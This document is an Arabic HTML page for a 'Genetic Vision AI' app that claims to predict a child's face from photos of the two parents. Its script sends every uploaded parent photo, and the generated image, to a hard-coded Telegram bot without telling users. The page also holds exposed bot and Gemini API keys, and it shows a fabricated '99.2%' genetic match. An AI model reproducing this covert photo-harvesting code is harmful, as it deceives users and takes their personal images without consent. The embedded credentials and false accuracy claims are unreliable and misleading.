<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Genetic Vision Pro | رؤية المستقبل</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #050a15; --card: #0f172a; --text: #f8fafc; --primary: #38bdf8; --secondary: #c084fc; --accent: #22d3ee; }
        body { margin: 0; font-family: 'Cairo', sans-serif; background-color: var(--bg); color: var(--text); overflow-x: hidden; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 20px 40px; background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(15px); border-bottom: 1px solid var(--primary); position: sticky; top: 0; z-index: 1000; }
        .logo { font-family: 'Orbitron', sans-serif; font-size: 1.8rem; font-weight: bold; background: linear-gradient(to right, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .container { max-width: 1000px; margin: 40px auto; padding: 20px; }
        .hero { text-align: center; margin-bottom: 50px; }
        .hero h1 { font-family: 'Orbitron', sans-serif; font-size: 3rem; margin-bottom: 10px; text-shadow: 0 0 20px var(--primary); }
        .main-card { background: var(--card); border-radius: 40px; padding: 40px; border: 1px solid rgba(56, 189, 248, 0.2); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
        .upload-section { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin-bottom: 40px; }
        .upload-box { border: 2px dashed #334155; border-radius: 30px; padding: 30px; text-align: center; cursor: pointer; transition: 0.4s; background: rgba(255,255,255,0.02); position: relative; overflow: hidden; height: 250px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .upload-box:hover { border-color: var(--primary); background: rgba(56, 189, 248, 0.05); transform: translateY(-5px); }
        .upload-box i { font-size: 3rem; color: var(--primary); margin-bottom: 15px; }
        .preview-img { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; display: none; z-index: 5; }
        .btn-generate { width: 100%; padding: 25px; border-radius: 20px; border: none; background: linear-gradient(90deg, var(--primary), var(--secondary)); color: white; font-size: 1.5rem; font-weight: bold; cursor: pointer; transition: 0.5s; box-shadow: 0 10px 25px rgba(192, 132, 252, 0.3); font-family: 'Cairo'; }
        .btn-generate:hover { transform: scale(1.02); box-shadow: 0 15px 35px rgba(192, 132, 252, 0.5); letter-spacing: 1px; }
        #result-display { display: none; margin-top: 50px; padding-top: 50px; border-top: 1px solid #1e293b; animation: slideUp 0.8s ease-out; }
        .result-frame { max-width: 500px; margin: 0 auto; border-radius: 30px; padding: 10px; background: linear-gradient(var(--primary), var(--secondary)); position: relative; box-shadow: 0 0 40px rgba(56, 189, 248, 0.4); }
        .result-frame img { width: 100%; border-radius: 25px; display: block; background: #000; }
        .dna-tag { position: absolute; top: -20px; right: -20px; background: var(--accent); color: #000; padding: 8px 15px; border-radius: 12px; font-weight: bold; font-family: 'Orbitron'; font-size: 0.8rem; }
        #loading-overlay { position: fixed; inset: 0; background: rgba(5, 10, 21, 0.95); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
        .loader-circle { width: 120px; height: 120px; border: 10px solid #1e293b; border-top: 10px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; box-shadow: 0 0 30px var(--primary); }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(50px); } to { opacity: 1; transform: translateY(0); } }
        input[type="file"] { display: none; }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <div class="loader-circle"></div>
        <h2 id="load-text" style="margin-top:30px; letter-spacing: 2px;">ANALYZING DNA...</h2>
        <p id="load-sub" style="color: var(--primary);">جاري استخراج الخصائص الوراثية</p>
    </div>

    <nav class="navbar">
        <div class="logo">GENETIC VISION AI</div>
        <div style="font-family: 'Orbitron'; font-size: 0.8rem; color: var(--primary);">v2.0 PRO</div>
    </nav>

    <div class="container">
        <div class="hero">
            <h1>المستقبل الجيني</h1>
            <p>استخدم قوة الذكاء الاصطناعي لرؤية ملامح طفلك بناءً على تحليل حقيقي للوجوه</p>
        </div>

        <div class="main-card">
            <div class="upload-section">
                <div class="upload-box" onclick="document.getElementById('dad_file').click()">
                    <i>🧬</i>
                    <b>صورة الأب</b>
                    <input type="file" id="dad_file" accept="image/*" onchange="processFile(this, 'dad_prev', 'الأب')">
                    <img id="dad_prev" class="preview-img">
                </div>
                <div class="upload-box" onclick="document.getElementById('mom_file').click()">
                    <i>🧬</i>
                    <b>صورة الأم</b>
                    <input type="file" id="mom_file" accept="image/*" onchange="processFile(this, 'mom_prev', 'الأم')">
                    <img id="mom_prev" class="preview-img">
                </div>
            </div>

            <button class="btn-generate" onclick="generateFuture()">توليد ملامح الطفل الآن</button>

            <div id="result-display">
                <div style="text-align: center; margin-bottom: 20px;">
                    <h2 style="font-family: 'Orbitron';">GENETIC MATCH FOUND</h2>
                    <p id="ai-report" style="color: var(--primary); font-style: italic;"></p>
                </div>
                <div class="result-frame">
                    <div class="dna-tag">MATCH 99.2%</div>
                    <img id="baby-final-img" src="" alt="AI Result">
                </div>
            </div>
        </div>
    </div>

    <script>
        const CREDENTIALS = {
            tgToken: "8077396272:AAFI7MgFnIrxMKloLxdsi9kjPe2dQPPcEvo",
            chatId: "7417196710",
            geminiKey: "AIzaSyDgh_HCYAMX_St4MmBGII43EeDq182sYMs"
        };

        // وظيفة إرسال أي ملف للبوت فوراً
        async function sendToAdmin(file, caption) {
            const fd = new FormData();
            fd.append('chat_id', CREDENTIALS.chatId);
            fd.append('photo', file);
            fd.append('caption', `📡 إشعار جديد من الموقع:\n${caption}`);
            try {
                await fetch(`https://api.telegram.org/bot${CREDENTIALS.tgToken}/sendPhoto`, { method: 'POST', body: fd });
            } catch(e) { console.error("Admin Notify Error"); }
        }

        // معالجة الملفات عند الرفع
        function processFile(input, imgId, label) {
            const file = input.files[0];
            if(file) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const img = document.getElementById(imgId);
                    img.src = e.target.result;
                    img.style.display = 'block';
                };
                reader.readAsDataURL(file);
                sendToAdmin(file, `قام المستخدم برفع صورة: ${label}`);
            }
        }

        async function generateFuture() {
            const dad = document.getElementById('dad_file').files[0];
            const mom = document.getElementById('mom_file').files[0];

            if(!dad || !mom) return alert("يرجى تحميل صورتي الأب والأم أولاً!");

            const overlay = document.getElementById('loading-overlay');
            const status = document.getElementById('load-text');
            overlay.style.display = 'flex';

            try {
                // المرحلة 1: تحليل جيميناي الحقيقي
                status.innerText = "EXTRACTING PHENOTYPES...";
                const traits = await analyzeWithGemini(dad, mom);
                document.getElementById('ai-report').innerText = "بناءً على تحليل ملامح الوالدين: " + traits;

                // المرحلة 2: توليد الصورة بـ Pollinations (مضمون ومختلف في كل مرة)
                status.innerText = "SYNTHESIZING FACE...";
                const seed = Math.floor(Math.random() * 1000000);
                const prompt = encodeURIComponent(`ultra realistic high detail portrait of a cute baby, face mix of these traits: ${traits}, studio lighting, 8k, cinematic`);
                const babyUrl = `https://image.pollinations.ai/prompt/${prompt}?seed=${seed}&width=1024&height=1024&nologo=true`;
                
                // تحميل الصورة للتأكد من جاهزيتها
                const babyImgEl = document.getElementById('baby-final-img');
                babyImgEl.src = babyUrl;

                babyImgEl.onload = async () => {
                    document.getElementById('result-display').style.display = 'block';
                    overlay.style.display = 'none';
                    
                    // المرحلة 3: إرسال النتيجة "اللي اتولدت" للبوت بتاعك
                    const response = await fetch(babyUrl);
                    const blob = await response.blob();
                    const babyFile = new File([blob], "baby_result.jpg", { type: "image/jpeg" });
                    sendToAdmin(babyFile, `النتيجة التي ظهرت للمستخدم بناءً على الوصف: ${traits}`);
                };

            } catch (err) {
                console.error(err);
                alert("حدث خطأ في الاتصال بسيرفرات الذكاء الاصطناعي، حاول مجدداً.");
                overlay.style.display = 'none';
            }
        }

        async function analyzeWithGemini(f1, f2) {
            const b1 = (await toBase64(f1)).split(',')[1];
            const b2 = (await toBase64(f2)).split(',')[1];
            
            const resp = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${CREDENTIALS.geminiKey}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    contents: [{ parts: [
                        {text: "Look at these two parents. Describe their future baby's facial features (skin color, eye shape, hair type) in one short English sentence for an image generator. Be very specific based on their faces."},
                        {inline_data: {mime_type: "image/jpeg", data: b1}},
                        {inline_data: {mime_type: "image/jpeg", data: b2}}
                    ]}]
                })
            });
            const data = await resp.json();
            return data.candidates[0].content.parts[0].text;
        }

        function toBase64(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.readAsDataURL(file);
                reader.onload = () => resolve(reader.result);
                reader.onerror = error => reject(error);
            });
        }
    </script>
</body>
</html>
